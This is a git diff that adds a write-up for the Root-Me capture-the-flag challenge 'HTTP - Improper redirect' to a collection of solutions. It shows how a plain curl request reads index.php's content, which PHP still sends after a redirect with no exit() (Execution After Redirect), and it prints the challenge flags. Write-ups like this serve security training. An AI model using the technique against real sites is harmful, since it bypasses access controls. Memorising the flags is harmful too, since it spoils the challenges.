@@ -1,4 +1,4 @@
-# [Root-Me](./rootme.md) Root-Me Web Server [9/74]
+# [Root-Me](./rootme.md) Root-Me Web Server [11/74]
 
 Discover the mechanisms, protocols and technologies used on the Internet and learn to abuse them!
 
@@ -16,7 +16,7 @@ These challenges are designed to train users on HTML, HTTP and other server side
 8. [HTTP - Directory indexing](#http-directory-indexing) 🗸
 9. [HTTP - Headers](#http-headers) 🗸
 10. [HTTP - POST](#http-post) 🗸
-11. [HTTP - Improper redirect](#http-improper-redirect)
+11. [HTTP - Improper redirect](#http-improper-redirect) 🗸
 12. [HTTP - Verb tampering](#http-verb-tampering)
 13. [Install files](#install-files)
 14. [CRLF](#crlf)
@@ -1123,6 +1123,92 @@ Submitting the form, we get the flag.
 
 ~~~
 H7tp_h4s_N0_s3Cr37S_F0r_y0U
+~~~
+
+</details>
+
+---
+
+### [Web - Server](#contents) | [Root-Me](./rootme.md) | [Home](./index.md)
+
+---
+
+## HTTP Improper redirect
+
+- Author: Arod
+- Date: 26 November 2014
+- Points: 15
+- Level: 2
+
+### Statement
+
+Get access to index.
+
+### Links
+
+1. [challenge site](http://challenge01.root-me.org/web-serveur/ch32/).
+
+### Resources
+
+1. [Exploiting Improper Redirection in PHP Web Applications](https://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20Exploiting%20Improper%20Redirection%20in%20PHP%20Web%20Applications.pdf).
+
+### Solutions
+
+<details>
+
+<summary markdown="span">Solution 1</summary>
+
+Visiting the website, we find a html page:
+
+~~~html
+<html>
+  <body>
+    <link rel='stylesheet' property='stylesheet' id='s' type='text/css' href='/template/s.css' media='all' />
+    <iframe id='iframe' src='https://www.root-me.org/?page=externe_header'>
+    </iframe>
+    <p>You must be authenticated in order to access this page !
+    </p>
+    <form method="post" name="form" action="login.php">
+      <p>Login : 
+        <input type="text" name="login" >
+      </p>
+      <p>Password : 
+        <input type="password" name="password" >
+      </p>
+      <p>
+        <input type="submit" value="Log in" >
+      </p>
+    </form>
+  </body>
+</html>
+~~~
+
+When we try to access index.php we are redirected to login.php, however in CURL we can see the content of the index.php before redirection:
+
+~~~shell
+$ curl http://challenge01.root-me.org/web-serveur/ch32/index.php
+<html>
+<body><link rel='stylesheet' property='stylesheet' id='s' type='text/css' href='/template/s.css' media='all' /><iframe id='iframe' src='https://www.root-me.org/?page=externe_header'></iframe>
+<h1>Welcome !</h1>
+
+<p>Yeah ! The redirection is OK, but without exit() after the header('Location: ...'), PHP just continue the execution and send the page content !...</p>
+<p><a href="http://cwe.mitre.org/data/definitions/698.html">CWE-698: Execution After Redirect (EAR)</a></p>
+<p>The flag is : ExecutionAfterRedirectIsBad
+</p>
+</body>
+</html>
+~~~
+
+</details>
+
+### Answer
+
+<details>
+
+<summary markdown="span">Answer</summary>
+
+~~~
+ExecutionAfterRedirectIsBad
 ~~~
 
 </details>
